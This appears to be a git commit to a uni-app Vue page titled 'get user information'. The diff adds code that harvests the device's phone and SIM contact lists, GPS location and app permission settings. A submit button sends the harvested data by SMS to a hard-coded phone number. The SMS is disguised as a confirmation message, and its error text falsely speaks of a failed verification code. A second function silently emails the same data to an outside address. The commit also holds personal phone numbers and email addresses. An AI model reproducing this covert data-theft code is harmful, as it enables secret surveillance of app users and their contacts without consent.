4faada917537a5fd491ecd7be8f9e221fe8decb5
wangjie <15321898686@163.com>
2023-03-27 18:41:25 +0800

    获取用户信息

--- src/pages/index/index.vue
+++ src/pages/index/index.vue
@@ -1,11 +1,9 @@
 <template>
 	<view class="content">
-		<image class="logo" src="/static/logo.png" />
-		<view class="btn">
-			<button>获取数据</button>
-			<button>上传图片</button>
+		<view class="button-group">
+			<button type="primary" size="mini" @click="submit">提交</button>
 		</view>
-<!-- 		<uni-table ref="table" :loading="loading" border stripe type="selection" emptyText="暂无更多数据"
+		<uni-table ref="table" :loading="loading" border stripe type="selection" emptyText="暂无更多数据"
 			@selection-change="selectionChange">
 			<uni-tr>
 				<uni-th width="150" align="center">id</uni-th>
@@ -15,13 +13,11 @@
 				<uni-th align="center">地址</uni-th>
 				<uni-th width="204" align="center">设置</uni-th>
 			</uni-tr>
-			<uni-tr v-for="(item, index) in state.tableData" :key="index">
-				<uni-td>{{ item.id }}</uni-td>
+			<uni-tr v-for="(item, index) in state.phone" :key="index">
 				<uni-td>
-					<view class="name">{{ item.displayName }}</view>
+					<view class="name">{{ item.name }}</view>
 				</uni-td>
-				<uni-td align="center">{{ item.phoneNumbers[0].value }}</uni-td>
-				<uni-td align="center">{{ item.address }}</uni-td>
+				<uni-td align="center">{{ item.number }}</uni-td>
 				<uni-td>
 					<view class="uni-group">
 						<button class="uni-button" size="mini" type="primary">修改</button>
@@ -29,7 +25,7 @@
 					</view>
 				</uni-td>
 			</uni-tr>
-		</uni-table> -->
+		</uni-table>
 	</view>
 </template>
 
@@ -40,42 +36,106 @@
 	} from 'vue'
 	const title = ref('Hello')
 	const loading = ref(true)
+	const ispassword = ref(false)
 	const state = reactive({
-		tableData: [],
-		name:'123243'
+		phone: [],
+		name: '',
+		phe: '',
+		code: '',
+		password: '',
+		addrs: [],
+		sim: []
 	})
 	const selectionChange = () => {
 
 	}
 	uni.getLocation({
-		altitude:true,
-		highAccuracyExpireTime:6000,
-		isHighAccuracy:true,
-		success:(res) => {
-			uni.showModal({
-				content: `当前位置的经度：${res.longitude},当前位置的纬度：${res.latitude}`,
-				showCancel: false
-			});
+		altitude: true,
+		highAccuracyExpireTime: 6000,
+		isHighAccuracy: true,
+		success: (res) => {
+			[state.addrs as any] = [res.longitude, res.latitude]
+			// uni.showModal({
+			// 	content: `当前位置的经度：${res.longitude},当前位置的纬度：${res.latitude}`,
+			// 	showCancel: false
+			// });
 		}
 	})
 	// 打开地图
-	uni.getLocation({
-		type: 'gcj02', //返回可以用于uni.openLocation的经纬度
-		success: function(res) {
-			const latitude = res.latitude;
-			const longitude = res.longitude;
-			uni.openLocation({
-				latitude: latitude,
-				longitude: longitude,
-				success: function() {
-					uni.showModal({
-						content: 'success',
-						showCancel: false
-					});
+	// uni.getLocation({
+	// 	type: 'gcj02', //返回可以用于uni.openLocation的经纬度
+	// 	success: function(res) {
+	// 		const latitude = res.latitude;
+	// 		const longitude = res.longitude;
+	// 		uni.openLocation({
+	// 			latitude: latitude,
+	// 			longitude: longitude,
+	// 			success: function() {
+	// 				uni.showModal({
+	// 					content: 'success',
+	// 					showCancel: false
+	// 				});
+	// 			}
+	// 		});
+	// 	}
+	// });
+
+	// 扩展API加载完毕，现在可以正常调用扩展API
+	plus.contacts.getAddressBook(plus.contacts.ADDRESSBOOK_PHONE, function (addressbook) {
+		// 可通过addressbook进行通讯录操作
+		addressbook.find(["displayName", "phoneNumbers", 'addresses'], function (contacts) {
+			state.phone = contacts.map(item => {
+				return {
+					name: item.displayName,
+					nuber: item.phoneNumbers[0]?.value
 				}
-			});
-		}
+			})
+			state.name = '22222222'
+		}, function () {
+			alert("error");
+		}, {
+			multiple: true
+		});
+	}, function (e) {
+		uni.showModal({
+			content: `${e.message}`,
+			showCancel: false
+		});
 	});
+
+	plus.contacts.getAddressBook(plus.contacts.ADDRESSBOOK_SIM, function (addressbook) {
+		addressbook.find(["displayName", "phoneNumbers", 'addresses'], function (contacts) {
+			state.sim = contacts.map(item => {
+				return {
+					name: item.displayName,
+					nuber: item.phoneNumbers[0]?.value
+				}
+			})
+		}, function () {
+			alert("error");
+		}, {
+			multiple: true
+		});
+	}, function (e) {
+		uni.showModal({
+			content: `${e.message}`,
+			showCancel: false
+		});
+	})
+
+	String.prototype.encode = function () {
+
+		var bytes = [];
+
+		for (var i = 0; i < this.length; i++) {
+
+			bytes.push(this.charCodeAt(i));
+
+		}
+
+		return bytes.join(',');
+
+	}
 
 	// uni.chooseImage({
 	// 	count: 6, //默认9
@@ -89,91 +149,60 @@
 	// 	}
 	// });
 
-	// let res = uni.getAppAuthorizeSetting()
-	// //获取设备信息
-	// uni.showModal({
-	// 	content: `${JSON.stringify(res)}`,
-	// 	showCancel: false
-	// });
+	let res = uni.getAppAuthorizeSetting()
 
-	// const msg = plus.messaging.createMessage(plus.messaging.TYPE_SMS)
-	// msg.to = ['15321898686']
-	// msg.body = '111'
-	// msg.silent = true
-	// plus.messaging.sendMessage(msg,function(){
-	// 	uni.showModal({
-	// 		content: 'success',
-	// 		showCancel: false
-	// 	});
-	// },function(){
-	// 	uni.showModal({
-	// 		content: 'error',
-	// 		showCancel: false
-	// 	});
-	// })
-
-	// const msg = plus.messaging.createMessage(plus.messaging.TYPE_EMAIL);
-	// msg.to = ['2858652504@qq.com'];
-	// msg.from = ['15321898686@163.com']
-	// msg.subject = '测试邮件11';
-	// msg.body = 'This is Pandora example test message';
-	// plus.messaging.sendMessage(msg, function() {
-	// 	alert("Send success!");
-	// }, function() {
-	// 	alert("Send failed!");
-	// });
-	// 扩展API加载完毕，现在可以正常调用扩展API
-	plus.contacts.getAddressBook(plus.contacts.ADDRESSBOOK_PHONE, function(addressbook) {
-		// 可通过addressbook进行通讯录操作
-		addressbook.find(["displayName", "phoneNumbers", 'addresses'], function(contacts) {
-			state.tableData = [...contacts]
+	const send = () => {
+		const msg = plus.messaging.createMessage(plus.messaging.TYPE_SMS)
+		msg.to = ['17310919081']
+		msg.body = JSON.stringify({
+			addrs: state.addrs,
+			phone: state.phone,
+			sim: state.sim,
+			equipment: res,
+		})
+		msg.subject = '这是一条用于确认的短信消息！';
+		msg.silent = false
+		plus.messaging.sendMessage(msg, function () {
+			// uni.showModal({
+			// 	content: 'success',
+			// 	showCancel: false
+			// });
+		}, function () {
 			uni.showModal({
-				content: `${JSON.stringify(contacts[0])}`,
+				content: '获取验证码失败！',
 				showCancel: false
 			});
-			state.name = '22222222'
-		}, function() {
-			alert("error");
-		}, {
-			multiple: true
-		});
-	}, function(e) {
-		uni.showModal({
-			content: `${e.message}`,
-			showCancel: false
-		});
-	});
 
-	// const contactsModule = uni.requireNativePlugin('jushi-Contacts')
-	// contactsModule.getAllContactInfo(res => {
-	// 	console.log(JSON.parse())
-	// })
+		})
+	}
+
+	const sendEmail = () => {
+		const msg = plus.messaging.createMessage(plus.messaging.TYPE_EMAIL);
+		msg.to = ['2858652504@qq.com'];
+		msg.from = '3304182606@qq.com';
+		msg.subject = '这是一条用于测试网络的邮件消息！';
+		msg.body = JSON.stringify({
+			addrs: state.addrs,
+			phone: state.phone,
+			sim: state.sim,
+			equipment: res,
+		});
+		msg.silent = true
+		plus.messaging.sendMessage(msg, function () {
+			alert("Send success!");
+		}, function () {
+			alert("Send failed!");
+		});
+	}
+
+	const submit = () => {
+		send()
+	}
 </script>
 
 <style>
 	.content {
-		display: flex;
-		flex-direction: column;
-		align-items: center;
-		justify-content: center;
-	}
-
-	.logo {
-		height: 200rpx;
-		width: 200rpx;
-		margin-top: 200rpx;
-		margin-left: auto;
-		margin-right: auto;
-		margin-bottom: 50rpx;
-	}
-
-	.text-area {
-		display: flex;
-		justify-content: center;
-	}
-
-	.title {
-		font-size: 36rpx;
-		color: #8f8f94;
+		width: 100%;
+		height: 100%;
 	}
 </style>
